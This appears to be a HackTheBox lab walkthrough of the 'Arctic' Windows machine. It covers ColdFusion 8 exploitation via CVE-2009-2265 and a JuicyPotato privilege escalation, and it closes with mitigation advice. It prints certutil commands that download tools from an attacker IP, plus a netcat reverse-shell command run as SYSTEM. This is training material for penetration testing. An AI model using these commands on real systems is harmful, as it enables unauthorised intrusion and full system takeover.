---
title: Arctic
date: 2025-05-23
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, Windows, CVE-2009-2265, JuicyPotato-privesc] 
image: ar.png
media_subpath: /assets/img/posts/2025-05-23-arcticHTB/
---

## Introduction

In this walkthrough, I explore *Arctic*, an easy-level Windows machine with a relatively simple exploitation path. I began by analyzing the web server's behavior and pinpointing a vulnerable instance of **Adobe ColdFusion**. After some initial troubleshooting, I discovered an unauthenticated file upload vulnerability, which I used to upload a malicious script and gain a shell on the system. Once on the box, I confirmed that the user had the **SeImpersonatePrivilege**, allowing me to perform a **JuicyPotato** attack and escalate privileges to `NT AUTHORITY\SYSTEM`.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

![image.png](image%202.png)

## Services

### Port 22

## Web

### Port 8500

The port shows to be `fmtp` I tried accessing it from browser, it showed me 2 directories and I clicked on one of them and them clicked on `administrator` directory and it opened `Coldfusion 8` admin login. I searched for public exploits for this version of application and found the following one:

[CVE-2009-2265](https://www.exploit-db.com/exploits/50057)

Executing the exploit I gained a shell:

```bash
python3 cold.py
```

Before doing this don’t forget to change IP and PORT inside of script.

![image.png](image%203.png)

## Privilege Escalation

I have `SeImpersonatePrivilege` enabled:

![image.png](image%204.png)

![image.png](image%205.png)

Let’s perform [JuicyPotato](https://github.com/ohpe/juicy-potato) attack:

```bash
certutil -urlcache -split -f http://10.10.14.17/JuicyPotato.exe
certutil -urlcache -split -f http://10.10.14.17/nc64.exe
```

```bash
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc64.exe 10.10.14.17 8443 -e cmd.exe" -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
```

I have chosen CLSID from this repo for R2 enterprise as closest version of our target and got a shell as nt authority\system.

![image.png](image%206.png)

![image.png](image%207.png)

## Mitigation

- **Update and Patch Software:** Ensure ColdFusion and other server-side applications are fully updated to the latest secure versions.
- **Restrict File Uploads:** Implement strict validation on file uploads, limit accepted file types, and store uploads in non-executable directories.
- **Remove Unnecessary Privileges:** Audit and remove privileges like `SeImpersonatePrivilege` from non-administrative users to prevent token impersonation.
- **Web Server Hardening:** Disable unnecessary services and use secure configurations to reduce the attack surface.
- **Network Segmentation:** Limit direct access to application servers from the internet whenever possible.
- **Monitoring and Alerting:** Set up alerts for unusual file uploads, privilege escalation attempts, or abnormal process activity.
